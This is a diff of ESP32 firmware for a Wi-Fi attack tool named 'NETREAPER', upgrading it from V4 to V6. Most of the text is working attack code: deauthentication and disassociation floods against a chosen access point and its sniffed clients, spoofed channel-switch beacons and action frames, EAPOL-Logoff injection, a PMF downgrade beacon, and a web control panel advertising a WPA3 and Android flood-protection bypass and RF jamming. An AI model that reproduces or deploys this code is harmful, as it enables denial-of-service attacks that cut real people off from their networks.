@@ -38,7 +38,6 @@ int currentBeaconChannel=1;
 uint8_t capturedClients[20][6];
 int capturedClientCount=0;
 
-// Global sniffed clients for scan display
 struct SniffedClient{uint8_t bssid[6];uint8_t client[6];};
 SniffedClient globalSniffedClients[50];
 int globalSniffedCount=0;
@@ -56,7 +55,6 @@ String getVendorName(uint8_t* mac){
   return "Unknown";
 }
 
-// PMF detection helpers
 bool isPMFRequired(int encType){
   return (encType==WIFI_AUTH_WPA3_PSK||encType==WIFI_AUTH_WPA2_WPA3_PSK);
 }
@@ -114,21 +112,17 @@ void checkJammerButton(){
   l=cs;
 }
 
-// ===== SNIFFER (combined scan + deauth) =====
+// ===== SNIFFER =====
 void snifferCallback(void *buf, wifi_promiscuous_pkt_type_t type){
   if(type!=WIFI_PKT_MGMT && type!=WIFI_PKT_DATA) return;
-  
   uint8_t *p=((wifi_promiscuous_pkt_t*)buf)->payload;
   uint8_t *src=p+10, *dst=p+4, *bssid=p+16;
   uint8_t *clientMac=nullptr, *apMac=nullptr;
-
   if(memcmp(src,bssid,6)==0){clientMac=dst;apMac=bssid;}
   else if(memcmp(dst,bssid,6)==0){clientMac=src;apMac=bssid;}
-
   if(clientMac&&apMac){
     if(clientMac[0]==0xFF&&clientMac[1]==0xFF) return;
     if(clientMac[0]==0x33&&clientMac[1]==0x33) return;
-
     bool exists=false;
     for(int i=0;i<globalSniffedCount;i++){
       if(memcmp(globalSniffedClients[i].client,clientMac,6)==0){exists=true;break;}
@@ -138,7 +132,6 @@ void snifferCallback(void *buf, wifi_promiscuous_pkt_type_t type){
       memcpy(globalSniffedClients[globalSniffedCount].bssid,apMac,6);
       globalSniffedCount++;
     }
-
     if(isDeauthing&&memcmp(apMac,targetBSSID,6)==0){
       bool ex=false;
       for(int i=0;i<capturedClientCount;i++){
@@ -152,17 +145,14 @@ void snifferCallback(void *buf, wifi_promiscuous_pkt_type_t type){
   }
 }
 
-// ===== SCAN (with client counting + PMF detection) =====
+// ===== SCAN =====
 void startWiFiScan(){
   Serial.println("[*] Scanning & Sniffing Clients...");
   WiFi.mode(WIFI_AP_STA);WiFi.disconnect(true);delay(100);
-
   globalSniffedCount=0;
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_rx_cb(snifferCallback);
-
   networkCount=WiFi.scanNetworks(false,true);
-
   if(networkCount>0){
     for(int i=0;i<networkCount&&i<20;i++){
       scannedNetworks[i].ssid=WiFi.SSID(i);
@@ -172,16 +162,13 @@ void startWiFiScan(){
       scannedNetworks[i].encType=WiFi.encryptionType(i);
     }
   }
-
   Serial.println("[*] Extra sniffing 1-13...");
   for(int c=1;c<=13;c++){
     esp_wifi_set_channel(c,WIFI_SECOND_CHAN_NONE);
     delay(300);
   }
-
   esp_wifi_set_promiscuous(false);delay(50);
   WiFi.mode(WIFI_AP);delay(50);
-
   networkListHTML="";
   if(networkCount>0){
     for(int i=0;i<networkCount&&i<20;i++){
@@ -230,10 +217,10 @@ void startDeauth(int index){
   esp_wifi_set_promiscuous_rx_cb(snifferCallback);
   seqNum=0;capturedClientCount=0;
   digitalWrite(deauthLedPin,HIGH);isDeauthing=true;
-  Serial.printf("[*] V4 DEAUTH: '%s' Ch:%d Enc:%s PMF:%s\n",targetSSID.c_str(),targetChannel,getEncName(targetEncType).c_str(),targetPMFRequired?"REQ(bypass-limited)":"opt(deauth-OK)");
+  Serial.printf("[*] V6 DEAUTH: '%s' Ch:%d Enc:%s PMF:%s\n",targetSSID.c_str(),targetChannel,getEncName(targetEncType).c_str(),targetPMFRequired?"REQ(fast-CSA)":"opt(full)");
 }
 
-// ===== PMF DOWNGRADE BEACON (slow pacing) =====
+// ===== PMF DOWNGRADE BEACON (fast: 3 @ 20ms) =====
 void sendPMFDowngradeBeacon(){
   uint8_t pkt[128];
   pkt[0]=0x80;pkt[1]=0;pkt[2]=0;pkt[3]=0;
@@ -256,47 +243,37 @@ void sendPMFDowngradeBeacon(){
   pkt[o++]=1;pkt[o++]=0;
   pkt[o++]=0;pkt[o++]=0;pkt[o++]=0x0F;pkt[o++]=0xAC;pkt[o++]=2;
   pkt[o++]=0;pkt[o++]=0;
-  // SLOW: 5 beacons, 30ms apart (was 10 no delay)
-  for(int i=0;i<5;i++){
+  for(int i=0;i<3;i++){
     esp_wifi_80211_tx(WIFI_IF_AP,pkt,o,false);
     esp_wifi_80211_tx(WIFI_IF_STA,pkt,o,false);
-    delay(30);
+    delay(20);
   }
 }
 
-// ===== CSA BEACON FLOOD (NEW — primary WPA3 bypass attack) =====
-// Beacon frame with CSA IE — mobiles MUST process per 802.11 spec
-// Bypasses PMF entirely (beacons aren't protected management frames)
+// ===== CSA BEACON FLOOD (V6: 15 broadcast @ 30ms + unicast per client, switchCount=0) =====
 void sendCSABeaconFlood(){
   uint8_t pkt[80];
-  pkt[0]=0x80;pkt[1]=0x00;  // Beacon
+  pkt[0]=0x80;pkt[1]=0x00;
   pkt[2]=0;pkt[3]=0;
-  memset(&pkt[4],0xFF,6);              // DA = broadcast
-  memcpy(&pkt[10],targetBSSID,6);     // SA = REAL AP
-  memcpy(&pkt[16],targetBSSID,6);     // BSSID = REAL AP (mobile validates!)
-  uint16_t sc=(seqNum&0x0FFF)<<4;
-  pkt[22]=sc&0xFF;pkt[23]=(sc>>8)&0xFF;
-  seqNum=(seqNum+1)&0x0FFF;
+  memset(&pkt[4],0xFF,6);
+  memcpy(&pkt[10],targetBSSID,6);
+  memcpy(&pkt[16],targetBSSID,6);
   int o=24;
   uint64_t ts=esp_timer_get_time();
   memcpy(&pkt[o],&ts,8);o+=8;
-  pkt[o++]=0x64;pkt[o++]=0x00;  // Beacon interval
-  pkt[o++]=0x01;pkt[o++]=0x00;  // Capability: ESS
-  pkt[o++]=0x00;pkt[o++]=0x00;  // SSID (empty)
-  pkt[o++]=0x01;pkt[o++]=0x01;pkt[o++]=0x82;  // Supported rates
-  pkt[o++]=0x03;pkt[o++]=0x01;pkt[o++]=targetChannel;  // DS Param
-  pkt[o++]=0x25;  // CSA IE (id=37)
-  pkt[o++]=0x03;  // length
-  pkt[o++]=0x01;  // mode: silent until switch
+  pkt[o++]=0x64;pkt[o++]=0x00;
+  pkt[o++]=0x01;pkt[o++]=0x00;
+  pkt[o++]=0x00;pkt[o++]=0x00;
+  pkt[o++]=0x01;pkt[o++]=0x01;pkt[o++]=0x82;
+  pkt[o++]=0x03;pkt[o++]=0x01;pkt[o++]=targetChannel;
+  pkt[o++]=0x25;pkt[o++]=0x03;pkt[o++]=0x01;
   int csaIdx=o;
-  pkt[o++]=0;     // new channel (placeholder)
-  pkt[o++]=1;     // switch count = immediate
-  // Invalid channels: 14 unsupported in most regions, 1 forces rescan
-  uint8_t invalidChannels[]={14,1,14,12,13,1,14,1,12,13,14,1,13,12,1,14,12,13,1,14};
-  // SLOW: 20 beacons, 50ms apart
-  for(int i=0;i<20;i++){
+  pkt[o++]=14;
+  pkt[o++]=0;
+  uint8_t invalidChannels[]={14,1,14,12,13,1,14,1,12,13,14,1,13,12,1};
+  for(int i=0;i<15;i++){
     pkt[csaIdx]=invalidChannels[i];
-    pkt[csaIdx+1]=1;
+    pkt[csaIdx+1]=0;
     uint64_t ts2=esp_timer_get_time();
     memcpy(&pkt[24],&ts2,8);
     uint16_t sc2=(seqNum&0x0FFF)<<4;
@@ -304,11 +281,26 @@ void sendCSABeaconFlood(){
     seqNum=(seqNum+1)&0x0FFF;
     esp_wifi_80211_tx(WIFI_IF_AP,pkt,o,false);
     esp_wifi_80211_tx(WIFI_IF_STA,pkt,o,false);
-    delay(50);
+    delay(30);
+  }
+  for(int c=0;c<capturedClientCount&&c<20;c++){
+    memcpy(&pkt[4],capturedClients[c],6);
+    pkt[csaIdx]=14;
+    pkt[csaIdx+1]=0;
+    for(int i=0;i<3;i++){
+      uint64_t ts2=esp_timer_get_time();
+      memcpy(&pkt[24],&ts2,8);
+      uint16_t sc2=(seqNum&0x0FFF)<<4;
+      pkt[22]=sc2&0xFF;pkt[23]=(sc2>>8)&0xFF;
+      seqNum=(seqNum+1)&0x0FFF;
+      esp_wifi_80211_tx(WIFI_IF_AP,pkt,o,false);
+      delay(20);
+    }
+    memset(&pkt[4],0xFF,6);
   }
 }
 
-// ===== CSA ACTION ATTACK (slow pacing) =====
+// ===== CSA ACTION ATTACK (fast: 2 @ 30ms) =====
 void sendCSAActionAttack(){
   const uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
   uint8_t ic[]={255,14,100,165,200,0,13,12};
@@ -316,147 +308,120 @@ void sendCSAActionAttack(){
   c[0]=0xD0;c[1]=0;c[2]=0x3A;c[3]=1;
   memcpy(&c[4],bc,6);memcpy(&c[10],targetBSSID,6);memcpy(&c[16],targetBSSID,6);
   c[24]=0;c[25]=4;c[26]=1;c[28]=0;
-  // Slow broadcast CSA
   for(int ch=0;ch<8;ch++){
     c[27]=ic[ch];
-    for(int i=0;i<3;i++){
+    for(int i=0;i<2;i++){
       uint16_t sc=(seqNum&0x0FFF)<<4;
       c[22]=sc&0xFF;c[23]=(sc>>8)&0xFF;
       seqNum=(seqNum+1)&0x0FFF;
       esp_wifi_80211_tx(WIFI_IF_AP,c,29,false);
       esp_wifi_80211_tx(WIFI_IF_STA,c,29,false);
-      delay(50);
+      delay(30);
     }
   }
-  // Per-client CSA
   for(int c2=0;c2<capturedClientCount&&c2<20;c2++){
     memcpy(&c[4],capturedClients[c2],6);
     c[27]=255;
-    for(int r=0;r<3;r++){
+    for(int r=0;r<2;r++){
       uint16_t sc=(seqNum&0x0FFF)<<4;
       c[22]=sc&0xFF;c[23]=(sc>>8)&0xFF;
       seqNum=(seqNum+1)&0x0FFF;
       esp_wifi_80211_tx(WIFI_IF_AP,c,29,false);
-      delay(50);
-    }
-  }
-}
-
-// ===== EAPOL LOGOFF (fixed: To DS=1, slow pacing) =====
-void sendEAPOLLogoff(){
-  const uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-  uint8_t e[38];
-  e[0]=0x08;  // Data frame
-  e[1]=0x01;  // To DS=1 (client→AP direction — was 0, AP might drop)
-  e[2]=0x3A;e[3]=1;
-  memcpy(&e[4],targetBSSID,6);  // DA = AP
-  memcpy(&e[10],bc,6);          // SA = client (overwritten per client)
-  memcpy(&e[16],targetBSSID,6); // BSSID = REAL AP
-  e[24]=0xAA;e[25]=0xAA;e[26]=3;e[27]=0;e[28]=0;e[29]=0;
-  e[30]=0x88;e[31]=0x8E;  // EAPOL ethertype
-  e[32]=1;e[33]=2;          // EAPOL-Logoff
-  e[34]=0;e[35]=4;e[36]=0;e[37]=0;
-  for(int c=0;c<capturedClientCount&&c<20;c++){
-    memcpy(&e[10],capturedClients[c],6);
-    uint16_t sc=(seqNum&0x0FFF)<<4;
-    e[22]=sc&0xFF;e[23]=(sc>>8)&0xFF;
-    seqNum=(seqNum+1)&0x0FFF;
-    // SLOW: 30ms apart, 3 retries (was 5 no delay)
-    for(int r=0;r<3;r++){
-      esp_wifi_80211_tx(WIFI_IF_AP,e,38,false);
-      esp_wifi_80211_tx(WIFI_IF_STA,e,38,false);
       delay(30);
     }
   }
 }
 
-// ==================================================================
-// ===== V4 POWERFUL DEAUTH (WPA2/WPA3 BYPASS) =====================
-// ==================================================================
+// ===== EAPOL LOGOFF (fast: 2 @ 20ms per client) =====
+void sendEAPOLLogoff(){
+  const uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  uint8_t e[38];
+  e[0]=0x08;e[1]=0x01;e[2]=0x3A;e[3]=1;
+  memcpy(&e[4],targetBSSID,6);memcpy(&e[10],bc,6);memcpy(&e[16],targetBSSID,6);
+  e[24]=0xAA;e[25]=0xAA;e[26]=3;e[27]=0;e[28]=0;e[29]=0;
+  e[30]=0x88;e[31]=0x8E;e[32]=1;e[33]=2;e[34]=0;e[35]=4;e[36]=0;e[37]=0;
+  for(int c=0;c<capturedClientCount&&c<20;c++){
+    memcpy(&e[10],capturedClients[c],6);
+    uint16_t sc=(seqNum&0x0FFF)<<4;
+    e[22]=sc&0xFF;e[23]=(sc>>8)&0xFF;
+    seqNum=(seqNum+1)&0x0FFF;
+    for(int r=0;r<2;r++){
+      esp_wifi_80211_tx(WIFI_IF_AP,e,38,false);
+      esp_wifi_80211_tx(WIFI_IF_STA,e,38,false);
+      delay(20);
+    }
+  }
+}
+
+// ===== V6 POWERFUL DEAUTH (FAST CYCLE ~4s) =====
 void sendPowerfulDeauth(){
-  // VERIFY channel — fix drift
   uint8_t curCh=0;
   wifi_second_chan_t sc2;
   esp_wifi_get_channel(&curCh,&sc2);
   if(curCh!=targetChannel){
-    Serial.printf("[!] Channel drift! %d→%d\n",curCh,targetChannel);
     esp_wifi_set_channel(targetChannel,WIFI_SECOND_CHAN_NONE);
-    delay(50);
+    delay(30);
   }
 
   const uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
   uint8_t reasons[]={1,2,4,5,6,7};
   int nr=6;
 
-  // ----- Phase 1: PMF degradation burst -----
   sendPMFDowngradeBeacon();
-
-  // ----- Phase 2: CSA BEACON FLOOD (PRIMARY — bypasses PMF/WPA3) -----
   sendCSABeaconFlood();
 
-  // ----- Phase 3: per-client slow deauth + disassoc (15 each, 50ms apart) -----
-  // Below Android's 30-in-60s flood threshold
-  for(int c=0;c<capturedClientCount&&c<20;c++){
-    uint8_t* clientMac=capturedClients[c];
-
-    // 15 deauth frames (AP→client, REAL BSSID)
-    for(int i=0;i<15;i++){
-      uint8_t d[26];
-      d[0]=0xC0;d[1]=0;d[2]=0x3A;d[3]=1;
-      memcpy(&d[4],clientMac,6);     // DA = client
-      memcpy(&d[10],targetBSSID,6);  // SA = REAL AP
-      memcpy(&d[16],targetBSSID,6);  // BSSID = REAL AP (mobile validates!)
-      uint16_t sc=(seqNum&0x0FFF)<<4;
-      d[22]=sc&0xFF;d[23]=(sc>>8)&0xFF;
-      d[24]=reasons[i%nr];d[25]=0;
-      seqNum=(seqNum+1)&0x0FFF;
-      esp_wifi_80211_tx(WIFI_IF_AP,d,26,false);
-      esp_wifi_80211_tx(WIFI_IF_STA,d,26,false);
-      delay(50);  // SLOW: 50ms between deauth
-    }
-    // 15 disassoc frames
-    for(int i=0;i<15;i++){
-      uint8_t d[26];
-      d[0]=0xA0;d[1]=0;d[2]=0x3A;d[3]=1;  // Disassoc
-      memcpy(&d[4],clientMac,6);
-      memcpy(&d[10],targetBSSID,6);
-      memcpy(&d[16],targetBSSID,6);
-      uint16_t sc=(seqNum&0x0FFF)<<4;
-      d[22]=sc&0xFF;d[23]=(sc>>8)&0xFF;
-      d[24]=reasons[(i+3)%nr];d[25]=0;
-      seqNum=(seqNum+1)&0x0FFF;
-      esp_wifi_80211_tx(WIFI_IF_AP,d,26,false);
-      delay(50);
+  if(capturedClientCount>0){
+    for(int c=0;c<capturedClientCount&&c<20;c++){
+      uint8_t* clientMac=capturedClients[c];
+      for(int i=0;i<10;i++){
+        uint8_t d[26];
+        d[0]=0xC0;d[1]=0;d[2]=0x3A;d[3]=1;
+        memcpy(&d[4],clientMac,6);
+        memcpy(&d[10],targetBSSID,6);
+        memcpy(&d[16],targetBSSID,6);
+        uint16_t sc=(seqNum&0x0FFF)<<4;
+        d[22]=sc&0xFF;d[23]=(sc>>8)&0xFF;
+        d[24]=reasons[i%nr];d[25]=0;
+        seqNum=(seqNum+1)&0x0FFF;
+        esp_wifi_80211_tx(WIFI_IF_AP,d,26,false);
+        esp_wifi_80211_tx(WIFI_IF_STA,d,26,false);
+        delay(30);
+      }
+      for(int i=0;i<10;i++){
+        uint8_t d[26];
+        d[0]=0xA0;d[1]=0;d[2]=0x3A;d[3]=1;
+        memcpy(&d[4],clientMac,6);
+        memcpy(&d[10],targetBSSID,6);
+        memcpy(&d[16],targetBSSID,6);
+        uint16_t sc=(seqNum&0x0FFF)<<4;
+        d[22]=sc&0xFF;d[23]=(sc>>8)&0xFF;
+        d[24]=reasons[(i+3)%nr];d[25]=0;
+        seqNum=(seqNum+1)&0x0FFF;
+        esp_wifi_80211_tx(WIFI_IF_AP,d,26,false);
+        delay(30);
+      }
     }
   }
 
-  // ----- Phase 4: Broadcast deauth (catches MAC-randomized mobiles) -----
-  for(int i=0;i<10;i++){
+  for(int i=0;i<6;i++){
     uint8_t d[26];
     d[0]=0xC0;d[1]=0;d[2]=0x3A;d[3]=1;
-    memcpy(&d[4],bc,6);              // DA = broadcast
-    memcpy(&d[10],targetBSSID,6);    // SA = REAL AP
-    memcpy(&d[16],targetBSSID,6);    // BSSID = REAL AP
+    memcpy(&d[4],bc,6);
+    memcpy(&d[10],targetBSSID,6);
+    memcpy(&d[16],targetBSSID,6);
     uint16_t sc=(seqNum&0x0FFF)<<4;
     d[22]=sc&0xFF;d[23]=(sc>>8)&0xFF;
     d[24]=reasons[i%nr];d[25]=0;
     seqNum=(seqNum+1)&0x0FFF;
     esp_wifi_80211_tx(WIFI_IF_AP,d,26,false);
     esp_wifi_80211_tx(WIFI_IF_STA,d,26,false);
-    delay(100);  // VERY slow for broadcast
+    delay(80);
   }
 
-  // ----- Phase 5: CSA Action attack (some mobiles respond) -----
   sendCSAActionAttack();
-
-  // ----- Phase 6: EAPOL Logoff per client -----
-  sendEAPOLLogoff();
-
-  // ----- Phase 7: PMF degrade again -----
+  if(capturedClientCount>0) sendEAPOLLogoff();
   sendPMFDowngradeBeacon();
-
-  // ----- Phase 8: Brief pause before next cycle -----
-  delay(500);
+  delay(200);
 }
 
 void stopDeauth(){
@@ -540,27 +505,27 @@ void handleRoot(){
   String st="SYSTEM IDLE",sc="#00ff00",sd="";
   if(isJamming){st="MAX POWER RF JAMMING";sc="#ffaa00";sd="<p style='color:#fff;'>GPIO 4 to stop.</p>";}
   else if(isDeauthing){
-    st="V4 DEAUTH (WPA2/WPA3 BYPASS)";sc="#ff0000";
+    st="V6 DEAUTH (FAST CYCLE)";sc="#ff0000";
     char b[18];sprintf(b,"%02X:%02X:%02X:%02X:%02X:%02X",targetBSSID[0],targetBSSID[1],targetBSSID[2],targetBSSID[3],targetBSSID[4],targetBSSID[5]);
     sd="<div style='background:#220000;padding:15px;border-radius:8px;border:1px solid #ff0000;text-align:left;'>";
     sd+="<p style='color:#fff;font-size:16px;'>Target: <b style='color:#ff5555;'>"+targetSSID+"</b></p>";
     sd+="<p style='color:#aaa;font-size:13px;'>BSSID: "+String(b)+" | Ch: "+String(targetChannel)+" | Enc: "+getEncName(targetEncType)+"</p>";
     if(targetPMFRequired){
-      sd+="<p style='color:#ff5555;font-size:13px;font-weight:bold;'>⚠ PMF REQUIRED (WPA3) — Deauth limited. CSA BEACON flood is primary attack.</p>";
+      sd+="<p style='color:#ff5555;font-size:13px;font-weight:bold;'>⚠ PMF REQUIRED (WPA3) — CSA Beacon flood is primary (switchCount=0 = immediate).</p>";
     } else {
-      sd+="<p style='color:#0f0;font-size:13px;'>PMF optional — Deauth + CSA both work.</p>";
+      sd+="<p style='color:#0f0;font-size:13px;'>PMF optional — All vectors active.</p>";
     }
     sd+="<p style='color:#ffaa00;font-size:14px;'>Captured Clients ("+String(capturedClientCount)+"):</p>";
     sd+="<div style='background:#110000;padding:8px;border-radius:5px;font-size:12px;color:#ff3333;max-height:120px;overflow-y:auto;'>";
-    if(capturedClientCount==0){sd+="<i style='color:#666;'>Sniffing for devices... (MAC-randomized mobiles won't show here — broadcast deauth will catch them)</i>";}
+    if(capturedClientCount==0){sd+="<i style='color:#666;'>Sniffing for devices... (broadcast deauth catches MAC-randomized)</i>";}
     else{for(int i=0;i<capturedClientCount;i++){char cm[18];sprintf(cm,"%02X:%02X:%02X:%02X:%02X:%02X",capturedClients[i][0],capturedClients[i][1],capturedClients[i][2],capturedClients[i][3],capturedClients[i][4],capturedClients[i][5]);String v=getVendorName(capturedClients[i]);sd+="&#9888; <b>["+v+"]</b> "+String(cm)+"<br>";}}
     sd+="</div>";
-    sd+="<p style='color:#00ffff;font-size:11px;margin-top:8px;'>V4: REAL BSSID + CSA BEACON flood (20x) + Slow deauth (15+15 per client @ 50ms) + Broadcast (10x @ 100ms) + CSA Action + EAPOL-Logoff + PMF-Degrade</p>";
-    sd+="<p style='color:#888;font-size:10px;'>Cycle: ~5-8s. Persistent loop. Bypasses Android 11+ flood protection & WPA3 PMF.</p>";
+    sd+="<p style='color:#00ffff;font-size:11px;margin-top:8px;'>V6: CSA BEACON (15+unicast, switchCount=0) + Fast deauth (10+10 @ 30ms) + Broadcast (6 @ 80ms) + CSA Action + EAPOL + PMF</p>";
+    sd+="<p style='color:#888;font-size:10px;'>Cycle: ~4s. Persistent. 2x faster than V4.</p>";
     sd+="</div>";
   }
   else if(isBeaconing){st="BEACON FLOOD";sc="#00ffff";sd="<p style='color:#fff;'>Flooding rajdeep_XXXX.</p>";}
-  
+
   String h="<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'><meta http-equiv='refresh' content='3'><style>";
   h+="body{background:#0a0a0a;color:#00ff00;font-family:monospace;text-align:center;padding:15px;}";
   h+="h1{color:#ff3333;text-shadow:0 0 10px #ff0000;}";
@@ -571,7 +536,7 @@ void handleRoot(){
   h+=".bs{background:#330000;border-color:#ff3333;color:#ff3333;}";
   h+="table{width:100%;border-collapse:collapse;margin-top:10px;}th,td{border:1px solid #333;padding:8px;}th{color:#00ff00;}td{color:#ccc;}";
   h+="</style></head><body>";
-  h+="<h1>NETREAPER V4</h1><div class='sb'><div class='st'>"+st+"</div>"+sd+"</div>";
+  h+="<h1>NETREAPER V6</h1><div class='sb'><div class='st'>"+st+"</div>"+sd+"</div>";
   h+="<a href='/scan' class='bf'>SCAN NETWORKS</a>";
   if(isDeauthing)h+="<a href='/deauth?idx=stop' class='bf bs'>STOP DEAUTH</a>";
   if(isBeaconing)h+="<a href='/beacon?action=stop' class='bf bs'>STOP BEACON</a>";
@@ -635,7 +600,7 @@ void setup(){
   server.on("/",handleRoot);server.on("/scan",handleScan);server.on("/deauth",handleDeauth);
   server.on("/beacon",handleBeacon);server.on("/rf",handleRFToggle);
   server.begin();
-  Serial.println("[*] V4 Ready — WPA2/WPA3 bypass via CSA beacon flood");
+  Serial.println("[*] V6 Ready — Fast cycle (~4s) + switchCount=0 + unicast CSA");
 }
 
 void loop(){
